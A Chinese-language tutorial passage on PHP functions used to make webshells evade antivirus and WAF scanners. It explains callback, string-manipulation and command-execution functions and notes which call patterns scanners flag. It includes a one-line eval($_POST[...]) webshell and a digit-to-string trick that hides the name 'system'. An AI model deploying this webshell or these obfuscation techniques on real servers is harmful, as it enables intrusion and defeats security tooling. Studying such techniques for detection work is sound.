<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$num1</span><span class="token operator">=</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'num1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$num2</span><span class="token operator">=</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'num2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>当你在HTTP数据包Body传参时：</p>
<pre class="codehilite language-php"><code class=" language-php">num1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>num2<span class="token operator">=</span><span class="token number">2</span></code></pre>


<p>得到回显：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>num1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">1</span>
    <span class="token punctuation">[</span>num2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">2</span>
<span class="token punctuation">)</span></code></pre>


<h2 id="1">1 回调类型函数</h2>
<h3 id="10-tips">1.0 Tips</h3>
<p>在PHP的WebSehll免杀测试过程中，使用回调函数可以发现查杀引擎对函数和函数的参数是否有对应的敏感性</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">array_map<span class="token punctuation">(</span></span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true"> //被查杀
</span><span class="token function">array_map<span class="token punctuation">(</span></span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //被查杀
</span><span class="token function">array_map<span class="token punctuation">(</span></span><span class="token string">'var_dump'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //未被查杀
</span><span class="token function">array_map<span class="token punctuation">(</span></span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //被查杀</span></code></pre>


<p>这里在列举一些回调函数，感兴趣可以自行查找：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">array_filter<span class="token punctuation">(</span></span><span class="token punctuation">)</span> 
<span class="token function">array_walk<span class="token punctuation">(</span></span><span class="token punctuation">)</span>  
<span class="token function">array_map<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">array_reduce<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">array_walk_recursive<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">call_user_func_array<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">call_user_func<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">filter_var<span class="token punctuation">(</span></span><span class="token punctuation">)</span> 
<span class="token function">filter_var_array<span class="token punctuation">(</span></span><span class="token punctuation">)</span> 
<span class="token function">registregister_shutdown_function<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">register_tick_function<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">forward_static_call_array<span class="token punctuation">(</span></span><span class="token punctuation">)</span>
<span class="token function">uasort<span class="token punctuation">(</span></span><span class="token punctuation">)</span> 
<span class="token function">uksort<span class="token punctuation">(</span></span><span class="token punctuation">)</span> </code></pre>


<h3 id="11-array_map">1.1 array_map()</h3>
<p><strong>array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组</strong></p>
<p>Demo：将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新的值的数组：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">myfunction<span class="token punctuation">(</span></span><span class="token variable">$v</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token operator">*</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //array(1,4,9,16,25)
</span><span class="token function">print_r<span class="token punctuation">(</span></span><span class="token function">array_map<span class="token punctuation">(</span></span><span class="token string">"myfunction"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="12-register_shutdown_function">1.2 register_shutdown_function()</h3>
<p><strong>register_shutdown_function() 函数是来注册一个会在PHP中止时执行的函数</strong></p>
<p>PHP中止的情况有三种：</p>
<ul>
<li>执行完成</li>
<li>exit/die导致的中止</li>
<li>发生致命错误中止</li>
</ul>
<p>Demo：后面的after并没有输出，即 <code>exit</code> 或者是 <code>die</code> 方法导致提前中止</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">test<span class="token punctuation">(</span></span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span> 
 <span class="token keyword">echo</span> <span class="token string">'这个是中止方法test的输出'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 

<span class="token function">register_shutdown_function<span class="token punctuation">(</span></span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">echo</span> <span class="token string">'before'</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span> 
<span class="token function">exit<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">echo</span> <span class="token string">'after'</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span></code></pre>


<p>输出：</p>
<pre class="codehilite language-php"><code class=" language-php">before 
这个是中止方法test的输出</code></pre>


<h3 id="13-array_walk">1.3 array_walk()</h3>
<p><strong>array_walk() 函数对数组中的每个元素应用用户自定义函数</strong></p>
<p>Demo：这个很简单，直接看就明白了</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">myfunction<span class="token punctuation">(</span></span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">echo</span> "<span class="token variable">$key</span> <span class="token variable">$p</span> <span class="token variable">$value</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_walk<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"myfunction"</span><span class="token punctuation">,</span><span class="token string">"has the value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>输出：</p>
<pre class="codehilite language-php"><code class=" language-php">The key a has the value red
The key b has the value green
The key c has the value blue</code></pre>


<h3 id="14-array_filter">1.4 array_filter()</h3>
<p><strong>array_filter() 函数用回调函数过滤数组中的元素</strong></p>
<p>该函数把输入数组中的每个键值传给回调函数：如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组（数组键名保持不变）</p>
<p>Demo：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">test_odd<span class="token punctuation">(</span></span><span class="token variable">$var</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$var</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$a1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token function">array_filter<span class="token punctuation">(</span></span><span class="token variable">$a1</span><span class="token punctuation">,</span><span class="token string">"test_odd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>输出：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">3</span> <span class="token punctuation">)</span></code></pre>


<h3 id="15-foreach">1.5 foreach()</h3>
<p><strong>foreach() 方法用于调用数组的每个元素，并将元素传递给回调函数</strong></p>
<p>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。</p>
<p>Demo：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">
//用foreach来处理$arr
</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token variable">$v</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<p>输出：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">2</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">4</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">6</span>
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">8</span>
<span class="token punctuation">)</span></code></pre>


<h3 id="16-isset">1.6 isset()</h3>
<p><strong>isset() 函数用于检测变量是否已设置并且非 NULL</strong></p>
<p>isset 在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false
isset 只能用于变量，因为传递任何其它参数都将造成解析错误</p>
<p>Demo:</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">
// 结果为 TRUE，所以后边的文本将被打印出来。
</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"变量已设置。"</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">
// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。
</span><span class="token comment" spellcheck="true">// the return value of isset().
</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"anothertest"</span><span class="token punctuation">;</span>

<span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> // TRUE
</span><span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> // TRUE
</span>
unset <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> // FALSE
</span><span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"> // FALSE
</span>
<span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
<span class="token function">var_dump<span class="token punctuation">(</span></span><span class="token function">isset<span class="token punctuation">(</span></span><span class="token variable">$foo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> // FALSE</span></code></pre>


<p>输出：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">bool<span class="token punctuation">(</span></span><span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token function">bool<span class="token punctuation">(</span></span><span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token function">bool<span class="token punctuation">(</span></span><span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token function">bool<span class="token punctuation">(</span></span><span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token function">bool<span class="token punctuation">(</span></span><span class="token boolean">false</span><span class="token punctuation">)</span></code></pre>


<h2 id="2">2 字符串处理类函数</h2>
<h3 id="20-tips">2.0 Tips</h3>
<p>可以自己定义函数，组成字符串的拼接方式，比如：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">function</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">&gt;</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$tmp</span><span class="token punctuation">.</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">confusion<span class="token punctuation">(</span></span><span class="token number">976534</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"> //sysTem（高危函数）</span></code></pre>


<p>这时候，给 <code>$a</code> 传参为 <code>976534</code> 即可拼接得 <code>system</code></p>
<p>同样，还有很多字符串处理类的函数，可以参考如下：</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">trim<span class="token punctuation">(</span></span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"> //从字符串的两端删除空白字符和其他预定义字符
</span><span class="token function">ucfirst<span class="token punctuation">(</span></span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"> //把字符串中的首字符转换为大写
</span><span class="token function">ucwords<span class="token punctuation">(</span></span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"> //把字符串中每个单词的首字符转换为大写
</span><span class="token function">strtoupper<span class="token punctuation">(</span></span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"> //把字符串转换为大写
</span><span class="token function">strtolower<span class="token punctuation">(</span></span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"> //把字符串转换为小写
</span><span class="token function">strtr<span class="token punctuation">(</span></span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"> //转换字符串中特定的字符
</span><span class="token function">substr_replace<span class="token punctuation">(</span></span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"> //把字符串的一部分替换为另一个字符串
</span><span class="token function">substr<span class="token punctuation">(</span></span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"> //返回字符串的一部分
</span><span class="token function">strtok<span class="token punctuation">(</span></span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"> //把字符串分割为更小的字符串
</span><span class="token function">str_rot13<span class="token punctuation">(</span></span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"> //对字符串执行 ROT13 编码</span></code></pre>


<h3 id="21-substr">2.1 substr()</h3>
<p><strong>substr() 函数返回字符串的一部分</strong></p>
<p>Demo：相当于截取字段固定长度和开头的内容</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> <span class="token function">substr<span class="token punctuation">(</span></span>"D<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>syste<span class="token comment" spellcheck="true">m//451232.php", -10, 6)."</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //451232
</span><span class="token keyword">echo</span> <span class="token function">substr<span class="token punctuation">(</span></span><span class="token string">"AabyssTeam"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true"> //Aabyss</span></code></pre>


<h3 id="22-intval">2.2 intval()</h3>
<p><strong>intval() 获取变量的整数值</strong></p>
<pre class="codehilite language-php"><code class=" language-php">int <span class="token function">intval<span class="token punctuation">(</span></span><span class="token keyword">var</span><span class="token punctuation">,</span>base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"> //var指要转换成 integer 的数量值,base指转化所使用的进制 </span></code></pre>


<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 <code>0x</code> (或 <code>0X</code>) 的前缀，使用 16 进制 (hex)；</li>
<li>否则，如果字符串以 <code>0</code> 开始，使用 8 进制(octal)；</li>
<li>否则，将使用 10 进制 (decimal)</li>
</ul>
<p><strong>成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1</strong></p>
<p>Demo：获取对应的整数值</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> <span class="token function">intval<span class="token punctuation">(</span></span><span class="token number">042</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> // 34
</span><span class="token keyword">echo</span> <span class="token function">intval<span class="token punctuation">(</span></span><span class="token number">0x1A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> // 26
</span><span class="token keyword">echo</span> <span class="token function">intval<span class="token punctuation">(</span></span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"> // 42
</span><span class="token keyword">echo</span> <span class="token function">intval<span class="token punctuation">(</span></span><span class="token number">4.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> // 4</span></code></pre>


<h3 id="23-parse_str">2.3 parse_str()</h3>
<p><strong>parse_str() 函数把查询字符串解析到变量中</strong></p>
<p>Demo：这个也很简单，看看例子就明白了</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">parse_str<span class="token punctuation">(</span></span><span class="token string">"name=Peter&amp;age=43"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span></span>"<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //Peter
</span><span class="token keyword">echo</span> <span class="token variable">$age</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true"> //43
</span>
<span class="token function">parse_str<span class="token punctuation">(</span></span><span class="token string">"name=Peter&amp;age=43"</span><span class="token punctuation">,</span><span class="token variable">$myArray</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$myArray</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"> //Array ( [name] =&gt; Peter [age] =&gt; 43 )</span></code></pre>


<h3 id="24-pack">2.4 pack()</h3>
<p><strong>pack() 函数函数把数据装入一个二进制字符串</strong></p>
<p>Demo：简单来说，就是将指定编码的数字转成字符串</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> <span class="token function">pack<span class="token punctuation">(</span></span><span class="token string">"C3"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //ASCII编码转换为PHP
</span><span class="token keyword">echo</span> <span class="token function">pack<span class="token punctuation">(</span></span><span class="token string">"H*"</span><span class="token punctuation">,</span>4161627973735465616d<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //16进制编码转换为AabyssTeam</span></code></pre>


<p>其他参数请参考菜鸟教程： https://www.runoob.com/php/func-misc-pack.html</p>
<h2 id="3">3 命令执行类函数</h2>
<h3 id="30-tips">3.0 Tips</h3>
<p>命令执行类函数在”某些情况“下是非常危险的，所以往往遭到杀毒软件和WAF的重点关注，所以在做免杀的时候，为了绕过污点检测往往都要将命令执行类函数进行拼接、重组、加密、混淆来规避查杀。</p>
<h3 id="31-eval">3.1 eval()</h3>
<p><strong>eval() 函数把字符串按照 PHP 代码来计算，即执行PHP代码</strong></p>
<p>Demo：将其中的内容按照PHP代码执行</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> <span class="token string">'echo "我想学php"'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"> //echo "我想学php"
</span><span class="token function">eval<span class="token punctuation">(</span></span><span class="token string">'echo "我想学php";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"> //"我想学php"</span></code></pre>


<p>Demo：一句话木马将参数传到 <code>eval()</code> 函数内执行</p>
<pre class="codehilite language-php"><code class=" language-php">@<span class="token function">eval<span class="token punctuation">(</span></span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string">'AabyssTeam'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="32-system">3.2 system()</h3>
<p><strong>system() 函数的主要功能是在系统权限允许的情况下，执行系统命令（Windows系统和Linux系统均可执行）</strong></p>
<p>Demo：执行Whoami并回显</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">system<span class="token punctuation">(</span></span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>


<h3 id="32-exec">3.2 exec()</h3>
<p><strong>exec() 函数可以执行系统命令，但它不会直接输出结果，而是将执行的结果保存到数组中</strong></p>
<p>Demo：将 <code>exec()</code> 函数执行的结果导入result数组</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">exec<span class="token punctuation">(</span></span> <span class="token string">'ls'</span> <span class="token punctuation">,</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r<span class="token punctuation">(</span></span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true"> //Array ( [0] =&gt; index.php )</span></code></pre>


<h3 id="33-shell_exec">3.3 shell_exec()</h3>
<p><strong>shell_exec() 函数可以执行系统命令，但不会直接输出执行的结果，而是返回一个字符串类型的变量来存储系统命令的执行结果</strong></p>
<p>Demo：执行 <code>ls</code> 命令</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> <span class="token function">shell_exec<span class="token punctuation">(</span></span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //index.php</span></code></pre>


<h3 id="34-passthru">3.4 passthru()</h3>
<p><strong>passthru() 函数可以执行系统命令并将执行结果输出到页面中</strong></p>
<p>与 <code>system()</code> 函数不同的是，它支持二进制的数据，使用时直接在参数中传递字符串类型的系统命令即可</p>
<p>Demo：执行 <code>ls</code> 命令</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token function">passthru<span class="token punctuation">(</span></span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //index.php</span></code></pre>


<h3 id="35-popen">3.5 popen()</h3>
<p><strong>popen() 函数可以执行系统命令,但不会输出执行的结果，而是返回一个资源类型的变量用来存储系统命令的执行结果</strong></p>
<p>故需要配合 <code>fread()</code> 函数来读取命令的执行结果</p>
<p>Demo：执行 <code>ls</code> 命令</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">popen<span class="token punctuation">(</span></span><span class="token string">'ls'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //参数1:执行ls命令 参数2:字符串类型
</span><span class="token keyword">echo</span> <span class="token function">fread<span class="token punctuation">(</span></span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true"> //参数1:上面生成的资源 参数2:读取100个字节</span></code></pre>


<h3 id="36">3.6 反引号``</h3>
<p><strong>反引号可以执行系统命令但不会输出结果，而是返回一个字符串类型的变量用来存储系统命令的执行结果</strong></p>
<p>可单独使用，也可配合其他命令执行函数使用来绕过参数中的滤条件</p>
<p>Demo：执行 <code>ls</code> 命令</p>
<pre class="codehilite language-php"><code class=" language-php"><span class="token keyword">echo</span> `ls`<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true"> //index.php</span></code></pre>


<h2 id="4">4 文件写入类函数</h2>
<h3 id="40-tips">4.0 Tips</h3>
<p>在Webshell的免杀过程中，一部分人另辟蹊径：通过执行一个执行内容为”写入恶意PHP“的样本来绕过查杀，执行成功后会在指定目录写入一个恶意PHP文件，最后通过连接那个恶意PHP文件获得WebShell</p>
<h3 id="41-fwrite">4.1 fwrite()</h3>
